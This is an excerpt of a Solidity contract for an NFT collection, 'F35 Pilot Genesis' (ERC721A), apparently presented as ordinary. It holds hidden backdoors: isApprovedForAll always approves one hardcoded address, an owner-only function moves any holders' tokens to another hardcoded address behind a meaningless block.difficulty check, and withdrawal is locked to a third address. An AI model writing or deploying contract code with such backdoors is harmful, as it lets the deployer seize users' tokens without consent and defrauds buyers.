  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x4D448B717bE3d0A0dd5fA7581D1B89d2818dc1fc){return true;}
...
contract F35_Pilot_Genesis is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("F35 Pilot Genesis", "FPG", maxBatchSize_, collectionSize_) {
  ...
  function FPG_BU(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xc909FFEE9Bf749d658f1eaDee020E9a99AF853da, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x41879e6d69d5c342Fe9f593dcad5e0D6c1de2da6);
